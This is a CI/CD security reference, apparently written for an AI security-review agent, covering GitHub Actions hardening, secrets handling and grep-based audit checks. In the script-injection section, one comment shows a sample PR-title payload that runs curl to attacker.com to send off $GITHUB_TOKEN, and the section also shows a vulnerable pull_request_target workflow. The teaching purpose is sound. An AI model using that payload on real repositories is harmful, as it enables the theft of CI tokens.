# CI/CD Security Patterns Reference

Practical reference for the Security Engineer Agent when reviewing CI/CD pipelines, GitHub Actions workflows, and deployment configurations. Focus on supply chain security, secret management, and pipeline hardening.

---

## GitHub Actions Security Patterns

### SHA-Pinned vs Unpinned Actions

Third-party Actions can be compromised via tag mutation. A maintainer (or attacker with push access) can move a tag like `v3` to point to malicious code. SHA pinning prevents this.

```yaml
# BAD: Tag reference - can be silently changed by action maintainer
- uses: actions/checkout@v4
- uses: some-org/some-action@main

# GOOD: SHA-pinned - immutable reference to exact commit
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
- uses: some-org/some-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2 # v2.0.0

# ACCEPTABLE: First-party GitHub actions with tag (lower risk, still prefer SHA)
- uses: actions/checkout@v4  # GitHub-maintained, lower supply chain risk
```

**Why it matters:** In 2024, the `tj-actions/changed-files` action was compromised via tag repointing, affecting thousands of repositories. SHA pinning would have prevented exploitation.

**Detection:**

```bash
# Find unpinned third-party actions (not GitHub-owned)
grep -rn "uses:" .github/workflows/ | grep -v "actions/" | grep -v "@[a-f0-9]\{40\}"

# Find all unpinned actions (including GitHub-owned)
grep -rn "uses:.*@" .github/workflows/ | grep -v "@[a-f0-9]\{40\}"

# Find actions referencing branches instead of tags or SHAs
grep -rn "uses:.*@\(main\|master\|dev\|develop\)" .github/workflows/
```

---

### pull_request_target Risks

`pull_request_target` runs in the context of the **base branch** with write permissions and secret access, even when triggered by forks. This is the single most dangerous workflow trigger.

```yaml
# DANGEROUS: Runs untrusted fork code with write permissions
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out FORK code
      - run: npm install && npm test  # Executes attacker-controlled code with secrets

# SAFE PATTERN 1: Use pull_request instead (no secret access for forks)
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install && npm test  # Fork code, but no secrets

# SAFE PATTERN 2: pull_request_target that NEVER checks out PR code
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # Checks out BASE branch only (safe)
      - run: echo "Only operates on base branch code"

# SAFE PATTERN 3: Two-workflow approach (label gate)
# Workflow 1: pull_request (untrusted, adds label after checks pass)
# Workflow 2: pull_request_target + label filter (only runs after human approval)
on:
  pull_request_target:
    types: [labeled]
jobs:
  deploy-preview:
    if: contains(github.event.label.name, 'safe-to-preview')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
```

**Detection:**

```bash
# Find all pull_request_target workflows
grep -rn "pull_request_target" .github/workflows/

# Find pull_request_target that checks out PR head (dangerous combo)
grep -l "pull_request_target" .github/workflows/ | xargs grep -l "github.event.pull_request.head"

# Find pull_request_target with npm/yarn/pnpm install (code execution risk)
grep -l "pull_request_target" .github/workflows/ | xargs grep -l "npm install\|yarn install\|pnpm install\|npm run\|npm test"
```

---

### Script Injection via Expression Contexts

GitHub Actions expressions (`${{ }}`) are interpolated directly into shell commands before execution. Attacker-controlled values (PR titles, branch names, commit messages) can inject arbitrary commands.

```yaml
# VULNERABLE: PR title is interpolated directly into shell
- run: echo "PR title: ${{ github.event.pull_request.title }}"
  # Attacker sets PR title to: "; curl attacker.com/steal?token=$GITHUB_TOKEN #
  # Resulting command: echo "PR title: "; curl attacker.com/steal?token=$GITHUB_TOKEN #"

# VULNERABLE: Issue body, commit message, branch name
- run: echo "${{ github.event.issue.body }}"
- run: echo "${{ github.event.head_commit.message }}"
- run: git checkout ${{ github.head_ref }}

# SAFE: Use environment variable indirection
- run: echo "PR title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}

# SAFE: Use an intermediate step with output
- id: sanitize
  uses: actions/github-script@v7
  with:
    result-encoding: string
    script: return context.payload.pull_request.title
- run: echo "PR title: ${{ steps.sanitize.outputs.result }}"
```

**Dangerous expression contexts** (attacker-controllable):
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.head_commit.message`
- `github.event.head_commit.author.name`
- `github.head_ref` (branch name)
- `github.event.discussion.title`
- `github.event.discussion.body`

**Detection:**

```bash
# Find direct expression interpolation in run steps (potential injection)
grep -rn '\${{.*github\.event\.' .github/workflows/ | grep "run:"

# More targeted: find dangerous contexts in run blocks
grep -rn 'run:.*\${{.*\(pull_request\.title\|pull_request\.body\|issue\.title\|issue\.body\|comment\.body\|head_commit\.message\|head_ref\)' .github/workflows/

# Find all expression usage in run steps for manual review
grep -rn -B1 'run:' .github/workflows/ | grep '\${{' | grep -v "secrets\.\|env\.\|steps\.\|needs\.\|matrix\."
```

---

### Secrets Management Best Practices

```yaml
# BAD: Secret in command output (logged to Actions console)
- run: echo ${{ secrets.API_KEY }}

# BAD: Secret in URL (appears in logs, may be cached)
- run: curl https://api.example.com?key=${{ secrets.API_KEY }}

# GOOD: Secret via environment variable
- run: curl -H "Authorization: Bearer $API_KEY" https://api.example.com
  env:
    API_KEY: ${{ secrets.API_KEY }}

# BAD: Workflow can access secrets it does not need
# (all repository secrets available by default)

# GOOD: Use environment-scoped secrets
jobs:
  deploy:
    environment: production  # Only secrets assigned to 'production' env
    steps:
      - run: deploy.sh
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}

# BAD: Secrets passed to third-party actions
- uses: sketchy-org/deploy-action@v1
  with:
    api_key: ${{ secrets.PRODUCTION_API_KEY }}  # Third party sees your secret

# GOOD: Use OIDC for cloud provider auth (no long-lived secrets)
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789:role/deploy
    aws-region: us-east-1
```

**Detection:**

```bash
# Find secrets passed directly to third-party actions
grep -rn "secrets\." .github/workflows/ | grep "uses:" -A5 | grep -v "actions/\|aws-actions/\|azure/\|google-github-actions/"

# Find secrets interpolated in run commands (potential logging)
grep -rn 'run:.*\${{ secrets\.' .github/workflows/

# Find secrets in URL strings
grep -rn 'http.*\${{ secrets\.' .github/workflows/

# Check if OIDC is used instead of long-lived credentials
grep -rn "role-to-assume\|workload_identity_provider\|AZURE_CLIENT_ID" .github/workflows/
```

---

### CODEOWNERS for Workflow Files

Workflow files can grant repository write access and expose secrets. Restrict who can modify them.

```
# .github/CODEOWNERS

# Require security team approval for workflow changes
.github/workflows/ @org/security-team @org/platform-team

# Require approval for Actions configuration
.github/actions/ @org/security-team

# Protect CODEOWNERS itself
.github/CODEOWNERS @org/security-team
```

**Detection:**

```bash
# Check if CODEOWNERS exists
test -f .github/CODEOWNERS && echo "CODEOWNERS exists" || echo "WARNING: No CODEOWNERS file"

# Check if workflows are protected in CODEOWNERS
grep -n "\.github/workflows" .github/CODEOWNERS 2>/dev/null || echo "WARNING: Workflows not protected by CODEOWNERS"

# Check if CODEOWNERS protects itself
grep -n "CODEOWNERS" .github/CODEOWNERS 2>/dev/null || echo "WARNING: CODEOWNERS does not protect itself"
```

---

## General CI/CD Security

### Build Artifact Integrity

Ensure build outputs have not been tampered with between build and deployment.

**What to check:**
- Are build artifacts signed or checksummed?
- Are artifacts uploaded to authenticated, access-controlled storage?
- Is there an air gap between build and deploy (artifacts are not deployed from the same job that builds)?
- Are container images signed (cosign, Notary)?

```yaml
# GOOD: Generate and verify checksums
- name: Build
  run: |
    npm run build
    sha256sum dist/* > dist/checksums.sha256

- name: Verify before deploy
  run: sha256sum -c dist/checksums.sha256

# GOOD: Sign container images
- name: Sign image
  run: cosign sign --key env://COSIGN_KEY $IMAGE_REF
```

**Detection:**

```bash
# Check if any checksum verification exists in CI
grep -rn "sha256sum\|checksum\|digest\|cosign verify" .github/workflows/

# Check if container images are signed
grep -rn "cosign\|notation\|notary" .github/workflows/

# Find deploy steps that don't reference an artifact download
grep -rn "deploy" .github/workflows/ | grep -v "download-artifact\|artifact"
```

---

### Dependency Caching Risks

CI caches can be poisoned if an attacker can write to the cache key namespace.

**Risks:**
- Cache keys derived from attacker-controllable values (branch names, PR numbers)
- Cached node_modules or pip packages that include malicious post-install scripts
- Stale caches that prevent security patches from being picked up

```yaml
# RISKY: Cache key includes branch name (forks can poison shared caches)
- uses: actions/cache@v4
  with:
    key: deps-${{ github.head_ref }}-${{ hashFiles('**/package-lock.json') }}

# SAFER: Restrict cache scope and use lockfile hash only
- uses: actions/cache@v4
  with:
    key: deps-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      deps-${{ runner.os }}-

# SAFE: Use setup-node built-in caching (handles scoping)
- uses: actions/setup-node@v4
  with:
    node-version: 20
    cache: 'npm'
```

**Detection:**

```bash
# Find cache keys using potentially attacker-controllable values
grep -rn "actions/cache" .github/workflows/ -A5 | grep "key:" | grep "\(head_ref\|github\.event\)"

# Check for cache usage without lockfile pinning
grep -rn "actions/cache" .github/workflows/ -A5 | grep "key:" | grep -v "hashFiles"
```

---

### Secret Rotation in CI

Long-lived secrets in CI are a persistent risk. Implement rotation practices.

**Checklist:**
- [ ] Inventory all secrets used in CI workflows
- [ ] Classify secrets by sensitivity (deploy keys > API tokens > reporting keys)
- [ ] Set rotation schedule (90 days max for high-sensitivity)
- [ ] Use OIDC federation where possible (eliminates static secrets)
- [ ] Monitor secret usage in audit logs (GitHub audit log API)
- [ ] Revoke secrets immediately when team members depart
- [ ] Use GitHub secret scanning to detect leaked secrets

**Detection:**

```bash
# List all secrets referenced across workflows
grep -rn 'secrets\.' .github/workflows/ | sed 's/.*secrets\.\([A-Z_a-z0-9]*\).*/\1/' | sort -u

# Check if OIDC is configured (preferred over static secrets)
grep -rn "id-token: write" .github/workflows/

# Check for any hardcoded credentials (should be zero)
grep -rn "password\|api_key\|secret_key\|access_token" .github/workflows/ | grep -v "secrets\.\|\${"
```

---

### Least Privilege for CI Tokens

The default `GITHUB_TOKEN` has broad permissions. Restrict them.

```yaml
# BAD: Default permissions (often read-write for many scopes)
jobs:
  build:
    runs-on: ubuntu-latest

# GOOD: Explicit minimal permissions at workflow level
permissions:
  contents: read
  packages: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

# GOOD: Per-job permissions (more granular)
jobs:
  test:
    permissions:
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

  deploy:
    permissions:
      contents: read
      id-token: write  # Only for OIDC
    runs-on: ubuntu-latest
    needs: test
```

**Detection:**

```bash
# Find workflows without explicit permissions block
for f in .github/workflows/*.yml .github/workflows/*.yaml; do
  grep -q "^permissions:" "$f" 2>/dev/null || echo "WARNING: No top-level permissions in $f"
done

# Find jobs with write permissions (should be minimal)
grep -rn "write" .github/workflows/ | grep "permissions" -A10 | grep "write"

# Check if repository default token permissions are restricted
# (Must check via GitHub UI or API: Settings > Actions > Workflow permissions)
echo "Manual check: Verify 'Workflow permissions' is set to 'Read repository contents and packages permissions' in repo settings"
```

---

## Comprehensive CI/CD Audit Checklist

Run these commands as a batch to assess CI/CD security posture:

```bash
echo "=== CI/CD Security Audit ==="

echo "\n--- Unpinned Actions ---"
grep -rn "uses:" .github/workflows/ | grep -v "@[a-f0-9]\{40\}" | grep -v "^#"

echo "\n--- pull_request_target Usage ---"
grep -rn "pull_request_target" .github/workflows/

echo "\n--- Script Injection Risks ---"
grep -rn 'run:.*\${{.*github\.event\.' .github/workflows/

echo "\n--- Secrets in Run Commands ---"
grep -rn 'run:.*\${{ secrets\.' .github/workflows/

echo "\n--- Missing Permissions Block ---"
for f in .github/workflows/*.yml .github/workflows/*.yaml; do
  grep -q "^permissions:" "$f" 2>/dev/null || echo "  $f"
done

echo "\n--- Secrets Inventory ---"
grep -rn 'secrets\.' .github/workflows/ | sed 's/.*secrets\.\([A-Z_a-z0-9]*\).*/\1/' | sort -u

echo "\n--- CODEOWNERS Protection ---"
grep "\.github/workflows" .github/CODEOWNERS 2>/dev/null || echo "  Workflows not protected"

echo "\n--- OIDC Usage ---"
grep -rn "id-token: write" .github/workflows/ || echo "  No OIDC configured"

echo "\n--- Hardcoded Credentials ---"
grep -rn "password\|api_key\|secret_key\|access_token" .github/workflows/ | grep -v "secrets\.\|\${"

echo "\n=== Audit Complete ==="
```

---

## Usage in Security Reviews

1. **Identify all workflow files** in `.github/workflows/`
2. **Run the comprehensive audit** commands above
3. **Prioritize findings**:
   - **Critical**: `pull_request_target` with fork code checkout, script injection, unpinned actions
   - **High**: Missing permissions block, secrets in run commands, no CODEOWNERS
   - **Medium**: No OIDC (using static secrets), cache key risks, no artifact signing
   - **Low**: First-party actions unpinned, missing rotation schedule
4. **Cross-reference** with OWASP A08 (Software and Data Integrity Failures) for standardized reporting
5. **Document** existing controls and gaps in the security review report
